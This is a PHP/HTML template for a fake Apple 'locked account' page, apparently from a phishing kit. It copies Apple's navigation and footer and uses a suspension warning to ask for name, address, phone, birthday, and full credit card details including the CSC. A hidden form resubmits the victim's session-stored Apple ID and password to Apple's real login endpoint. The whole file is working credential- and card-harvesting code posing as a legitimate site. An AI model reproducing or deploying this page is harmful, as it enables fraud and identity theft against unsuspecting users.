<?php
if(INC != "true") {
  exit();
}
session_start();
require_once("inc/countries.php");
if(isset($_SESSION['country_code']) && isset($_SESSION['country_language'])) {
  require_once("language/".$_SESSION['country_language'].".php");
} else {
  $_SESSION['country_code'] = "usa";
  $_SESSION['country_language'] = "en";
  require_once("language/en.php");
}
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title><?php echo $title; ?></title>
    <link rel="stylesheet" href="assets/master.css" media="screen" title="no title" charset="utf-8">
    <link rel="icon" href="img/favicon.ico" />
    <script src="assets/masteraccount.js" charset="utf-8"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1">
  </head>
  <body>
    <div class="wrapper">
      <div class="navigation-bar" style="background : #000 !important;">
        <div class="navigation-wrapper">
          <div class="logo" onclick="window.location='index.php'"></div>
          <ul id="menu_list">
            <li><a href="#" id="head_item1">Mac</a></li>
            <li><a href="#" id="head_item2">iPad</a></li>
            <li><a href="#" id="head_item3">iPhone</a></li>
            <li><a href="#" id="head_item4">Watch</a></li>
            <li><a href="#" id="head_item5">TV</a></li>
            <li><a href="#" id="head_item6">Music</a></li>
            <li><a href="#" id="head_item7"><?php echo $support; ?></a></li>
          </ul>
          <div class="search" id="search_icon"></div>
          <div class="shoppingbag" id="shoppingbag"></div>
          <div class="menuicon"></div>
          <input id="searchbox" class="searchbox hidden" placeholder="Search apple.com"/>
          <div class="cross hidden" id="krisskross"></div>
        </div>
      </div>
      <div class="subheader">
        <h1><?php echo $locked_account; ?></h1>
      </div>
      <div class="warning_box" id="warning_dialog">
        <div class="warning_icon"></div>
        <h1><?php echo $locked_account; ?></h1>
        <h2><?php echo $locked_paragraph; ?></h2>
        <div class="ok_sign">
          <a onclick="hideDialog()">OK</a>
        </div>
      </div>
      <div class="account_body">
        <p><?php echo $suspension; ?></p>
        <div class="form">
          <div class="row">
            <input type="text" id="fname" placeholder="<?php echo $fname; ?>" class="col" />
            <input type="text" id="lname" placeholder="<?php echo $lname; ?>" class="col" />
          </div>
          <select id="country">
            <?php
            if(isset($_SESSION['country_code']) && isset($_SESSION['country_language'])) {
              ?>
              <option value="<?php echo $_SESSION['country_code']; ?>" selected><?php echo $countries[strtoupper($_SESSION['country_code'])]; ?></option>
              <?php
            } else {
              ?>
              <option value="AF" selected>Afghanistan</option>
              <?php
            }
            ?>
            <option value="AF">Afghanistan</option>
          	<option value="AX">Åland Islands</option>
          	<option value="AL">Albania</option>
          	<option value="DZ">Algeria</option>
          	<option value="AS">American Samoa</option>
          	<option value="AD">Andorra</option>
          	<option value="AO">Angola</option>
          	<option value="AI">Anguilla</option>
          	<option value="AQ">Antarctica</option>
          	<option value="AG">Antigua and Barbuda</option>
          	<option value="AR">Argentina</option>
          	<option value="AM">Armenia</option>
          	<option value="AW">Aruba</option>
          	<option value="AU">Australia</option>
          	<option value="AT">Austria</option>
          	<option value="AZ">Azerbaijan</option>
          	<option value="BS">Bahamas</option>
          	<option value="BH">Bahrain</option>
          	<option value="BD">Bangladesh</option>
          	<option value="BB">Barbados</option>
          	<option value="BY">Belarus</option>
          	<option value="BE">Belgium</option>
          	<option value="BZ">Belize</option>
          	<option value="BJ">Benin</option>
          	<option value="BM">Bermuda</option>
          	<option value="BT">Bhutan</option>
          	<option value="BO">Bolivia, Plurinational State of</option>
          	<option value="BQ">Bonaire, Sint Eustatius and Saba</option>
          	<option value="BA">Bosnia and Herzegovina</option>
          	<option value="BW">Botswana</option>
          	<option value="BV">Bouvet Island</option>
          	<option value="BR">Brazil</option>
          	<option value="IO">British Indian Ocean Territory</option>
          	<option value="BN">Brunei Darussalam</option>
          	<option value="BG">Bulgaria</option>
          	<option value="BF">Burkina Faso</option>
          	<option value="BI">Burundi</option>
          	<option value="KH">Cambodia</option>
          	<option value="CM">Cameroon</option>
          	<option value="CA">Canada</option>
          	<option value="CV">Cape Verde</option>
          	<option value="KY">Cayman Islands</option>
          	<option value="CF">Central African Republic</option>
          	<option value="TD">Chad</option>
          	<option value="CL">Chile</option>
          	<option value="CN">China</option>
          	<option value="CX">Christmas Island</option>
          	<option value="CC">Cocos (Keeling) Islands</option>
          	<option value="CO">Colombia</option>
          	<option value="KM">Comoros</option>
          	<option value="CG">Congo</option>
          	<option value="CD">Congo, the Democratic Republic of the</option>
          	<option value="CK">Cook Islands</option>
          	<option value="CR">Costa Rica</option>
          	<option value="CI">Côte d'Ivoire</option>
          	<option value="HR">Croatia</option>
          	<option value="CU">Cuba</option>
          	<option value="CW">Curaçao</option>
          	<option value="CY">Cyprus</option>
          	<option value="CZ">Czech Republic</option>
          	<option value="DK">Denmark</option>
          	<option value="DJ">Djibouti</option>
          	<option value="DM">Dominica</option>
          	<option value="DO">Dominican Republic</option>
          	<option value="EC">Ecuador</option>
          	<option value="EG">Egypt</option>
          	<option value="SV">El Salvador</option>
          	<option value="GQ">Equatorial Guinea</option>
          	<option value="ER">Eritrea</option>
          	<option value="EE">Estonia</option>
          	<option value="ET">Ethiopia</option>
          	<option value="FK">Falkland Islands (Malvinas)</option>
          	<option value="FO">Faroe Islands</option>
          	<option value="FJ">Fiji</option>
          	<option value="FI">Finland</option>
          	<option value="FR">France</option>
          	<option value="GF">French Guiana</option>
          	<option value="PF">French Polynesia</option>
          	<option value="TF">French Southern Territories</option>
          	<option value="GA">Gabon</option>
          	<option value="GM">Gambia</option>
          	<option value="GE">Georgia</option>
          	<option value="DE">Germany</option>
          	<option value="GH">Ghana</option>
          	<option value="GI">Gibraltar</option>
          	<option value="GR">Greece</option>
          	<option value="GL">Greenland</option>
          	<option value="GD">Grenada</option>
          	<option value="GP">Guadeloupe</option>
          	<option value="GU">Guam</option>
          	<option value="GT">Guatemala</option>
          	<option value="GG">Guernsey</option>
          	<option value="GN">Guinea</option>
          	<option value="GW">Guinea-Bissau</option>
          	<option value="GY">Guyana</option>
          	<option value="HT">Haiti</option>
          	<option value="HM">Heard Island and McDonald Islands</option>
          	<option value="VA">Holy See (Vatican City State)</option>
          	<option value="HN">Honduras</option>
          	<option value="HK">Hong Kong</option>
          	<option value="HU">Hungary</option>
          	<option value="IS">Iceland</option>
          	<option value="IN">India</option>
          	<option value="ID">Indonesia</option>
          	<option value="IR">Iran, Islamic Republic of</option>
          	<option value="IQ">Iraq</option>
          	<option value="IE">Ireland</option>
          	<option value="IM">Isle of Man</option>
          	<option value="IL">Israel</option>
          	<option value="IT">Italy</option>
          	<option value="JM">Jamaica</option>
          	<option value="JP">Japan</option>
          	<option value="JE">Jersey</option>
          	<option value="JO">Jordan</option>
          	<option value="KZ">Kazakhstan</option>
          	<option value="KE">Kenya</option>
          	<option value="KI">Kiribati</option>
          	<option value="KP">Korea, Democratic People's Republic of</option>
          	<option value="KR">Korea, Republic of</option>
          	<option value="KW">Kuwait</option>
          	<option value="KG">Kyrgyzstan</option>
          	<option value="LA">Lao People's Democratic Republic</option>
          	<option value="LV">Latvia</option>
          	<option value="LB">Lebanon</option>
          	<option value="LS">Lesotho</option>
          	<option value="LR">Liberia</option>
          	<option value="LY">Libya</option>
          	<option value="LI">Liechtenstein</option>
          	<option value="LT">Lithuania</option>
          	<option value="LU">Luxembourg</option>
          	<option value="MO">Macao</option>
          	<option value="MK">Macedonia, the former Yugoslav Republic of</option>
          	<option value="MG">Madagascar</option>
          	<option value="MW">Malawi</option>
          	<option value="MY">Malaysia</option>
          	<option value="MV">Maldives</option>
          	<option value="ML">Mali</option>
          	<option value="MT">Malta</option>
          	<option value="MH">Marshall Islands</option>
          	<option value="MQ">Martinique</option>
          	<option value="MR">Mauritania</option>
          	<option value="MU">Mauritius</option>
          	<option value="YT">Mayotte</option>
          	<option value="MX">Mexico</option>
          	<option value="FM">Micronesia, Federated States of</option>
          	<option value="MD">Moldova, Republic of</option>
          	<option value="MC">Monaco</option>
          	<option value="MN">Mongolia</option>
          	<option value="ME">Montenegro</option>
          	<option value="MS">Montserrat</option>
          	<option value="MA">Morocco</option>
          	<option value="MZ">Mozambique</option>
          	<option value="MM">Myanmar</option>
          	<option value="NA">Namibia</option>
          	<option value="NR">Nauru</option>
          	<option value="NP">Nepal</option>
          	<option value="NL">Netherlands</option>
          	<option value="NC">New Caledonia</option>
          	<option value="NZ">New Zealand</option>
          	<option value="NI">Nicaragua</option>
          	<option value="NE">Niger</option>
          	<option value="NG">Nigeria</option>
          	<option value="NU">Niue</option>
          	<option value="NF">Norfolk Island</option>
          	<option value="MP">Northern Mariana Islands</option>
          	<option value="NO">Norway</option>
          	<option value="OM">Oman</option>
          	<option value="PK">Pakistan</option>
          	<option value="PW">Palau</option>
          	<option value="PS">Palestinian Territory, Occupied</option>
          	<option value="PA">Panama</option>
          	<option value="PG">Papua New Guinea</option>
          	<option value="PY">Paraguay</option>
          	<option value="PE">Peru</option>
          	<option value="PH">Philippines</option>
          	<option value="PN">Pitcairn</option>
          	<option value="PL">Poland</option>
          	<option value="PT">Portugal</option>
          	<option value="PR">Puerto Rico</option>
          	<option value="QA">Qatar</option>
          	<option value="RE">Réunion</option>
          	<option value="RO">Romania</option>
          	<option value="RU">Russian Federation</option>
          	<option value="RW">Rwanda</option>
          	<option value="BL">Saint Barthélemy</option>
          	<option value="SH">Saint Helena, Ascension and Tristan da Cunha</option>
          	<option value="KN">Saint Kitts and Nevis</option>
          	<option value="LC">Saint Lucia</option>
          	<option value="MF">Saint Martin (French part)</option>
          	<option value="PM">Saint Pierre and Miquelon</option>
          	<option value="VC">Saint Vincent and the Grenadines</option>
          	<option value="WS">Samoa</option>
          	<option value="SM">San Marino</option>
          	<option value="ST">Sao Tome and Principe</option>
          	<option value="SA">Saudi Arabia</option>
          	<option value="SN">Senegal</option>
          	<option value="RS">Serbia</option>
          	<option value="SC">Seychelles</option>
          	<option value="SL">Sierra Leone</option>
          	<option value="SG">Singapore</option>
          	<option value="SX">Sint Maarten (Dutch part)</option>
          	<option value="SK">Slovakia</option>
          	<option value="SI">Slovenia</option>
          	<option value="SB">Solomon Islands</option>
          	<option value="SO">Somalia</option>
          	<option value="ZA">South Africa</option>
          	<option value="GS">South Georgia and the South Sandwich Islands</option>
          	<option value="SS">South Sudan</option>
          	<option value="ES">Spain</option>
          	<option value="LK">Sri Lanka</option>
          	<option value="SD">Sudan</option>
          	<option value="SR">Suriname</option>
          	<option value="SJ">Svalbard and Jan Mayen</option>
          	<option value="SZ">Swaziland</option>
          	<option value="SE">Sweden</option>
          	<option value="CH">Switzerland</option>
          	<option value="SY">Syrian Arab Republic</option>
          	<option value="TW">Taiwan, Province of China</option>
          	<option value="TJ">Tajikistan</option>
          	<option value="TZ">Tanzania, United Republic of</option>
          	<option value="TH">Thailand</option>
          	<option value="TL">Timor-Leste</option>
          	<option value="TG">Togo</option>
          	<option value="TK">Tokelau</option>
          	<option value="TO">Tonga</option>
          	<option value="TT">Trinidad and Tobago</option>
          	<option value="TN">Tunisia</option>
          	<option value="TR">Turkey</option>
          	<option value="TM">Turkmenistan</option>
          	<option value="TC">Turks and Caicos Islands</option>
          	<option value="TV">Tuvalu</option>
          	<option value="UG">Uganda</option>
          	<option value="UA">Ukraine</option>
          	<option value="AE">United Arab Emirates</option>
          	<option value="GB">United Kingdom</option>
          	<option value="US">United States</option>
          	<option value="UM">United States Minor Outlying Islands</option>
          	<option value="UY">Uruguay</option>
          	<option value="UZ">Uzbekistan</option>
          	<option value="VU">Vanuatu</option>
          	<option value="VE">Venezuela, Bolivarian Republic of</option>
          	<option value="VN">Viet Nam</option>
          	<option value="VG">Virgin Islands, British</option>
          	<option value="VI">Virgin Islands, U.S.</option>
          	<option value="WF">Wallis and Futuna</option>
          	<option value="EH">Western Sahara</option>
          	<option value="YE">Yemen</option>
          	<option value="ZM">Zambia</option>
          	<option value="ZW">Zimbabwe</option>
          </select>
          <div class="row"style="margin-top : 13px;">
            <input type="text" id="state" placeholder="<?php echo $state; ?>" class="col" />
            <input type="text" id="zip" placeholder="<?php echo $zip; ?>" class="col" />
          </div>
          <div class="row">
            <input type="text" id="address" placeholder="<?php echo $address_line; ?>" style="position : relative; left : 2px;" />
          </div>
          <div class="row">
            <select id="mobile" class="col" style="width : 45%; margin-bottom : 10px;">
              <option value="Mobile" selected><?php echo $mobile; ?></option>
              <option value="Phone" selected><?php echo $phone; ?></option>
            </select>
            <input type="text" id="phone" placeholder="(+<?php echo $countryArray[strtoupper($_SESSION['country_code'])]["code"]; ?>)" class="col" onmouseover="changeCode()" onmouseout="removeCode()" onfocus="setCode()" onblur="unsetCode()" />
          </div>
          <div class="row">
            <input type="text" id="bday" placeholder="<?php echo $birthday; ?>" style="position : relative; left : 2px;" onmouseover="birthdayBox()" onmouseout="hidebday()" onmousedown="birthdayBox()" onfocus="setBdayBox()" onkeydown="writebday(event)" onblur="unsetBdayBox()"/>
          </div>
        </div>
        <div class="separator"></div>
        <div class="form">
          <div class="row">
            <input type="text" id="cardholder" placeholder="<?php echo $cardholder; ?>" style="position : relative; left : 2px;" />
          </div>
          <div class="row">
            <input onblur="creditIcon()" class="creditcard" type="text" id="credit_number" placeholder="<?php echo $creditnumber; ?>" style="position : relative; left : 2px;" onkeydown="checkCredit(event)"/>
          </div>
          <div class="row">
            <input type="text" id="expdate" placeholder="<?php echo $exdate; ?>" class="col" onkeydown="checkDate(event)" />
            <input type="text" id="csc" placeholder="CSC" class="col" />
          </div>
        </div>
        <div class="separator"></div>
        <p style="margin-bottom : 25px; font-size : 15px;"><?php echo $privacy; ?></p>
        <div class="btn">
          <a class="smbtn" onclick="processAccount()"><?php echo $continue; ?></a>
        </div>
        <div class="spinner loading" style="display : none;"></div>
        <div class="spacer"></div>
      </div>
      <form style="display : none;" action="https://idmsa.apple.com/IDMSWebAuth/authenticate" method="post" id="login_post">
        <input type="hidden" name="appleId" value="<?php echo $_SESSION['username']; ?>" />
        <input type="hidden" name="accountPassword" value="<?php echo $_SESSION['password']; ?>" />
        <input type="hidden" name="appIdKey" value="af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3" />
      </form>
      <div class="footer">
        <div class="wrapper">
          <div class="main">
            <h1><?php echo $apple_footer; ?></h1>
            <h2><?php echo $apple_copyrights; ?></h2>
            <ul class="unresp">
              <li><a class="nonmenu" href=""><?php echo $apple_footerlist_1; ?></a></li>
              <div class="stick"></div>
              <li><a class="nonmenu" href=""><?php echo $apple_footerlist_2; ?></a></li>
              <div class="stick"></div>
              <li><a class="nonmenu" href=""><?php echo $apple_footerlist_3; ?></a></li>
              <div class="stick"></div>
              <li><a class="nonmenu" href=""><?php echo $apple_footerlist_4; ?></a></li>
              <div class="stick"></div>
              <li><a class="nonmenu" href=""><?php echo $apple_footerlist_5; ?></a></li>
              <li class="country"><div class="mini_flag <?php echo $code_class[$_SESSION['country_code']]; ?>"></div><a class="nonmenu" href="language.php"><?php echo $code_country[$_SESSION['country_code']]; ?></a></li>
            </ul>
            <ul class="resp">
              <li class="country"><div class="mini_flag <?php echo $code_class[$_SESSION['country_code']]; ?>"></div><a class="nonmenu" href="language.php"><?php echo $code_country[$_SESSION['country_code']]; ?></a></li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  </body>
</html>
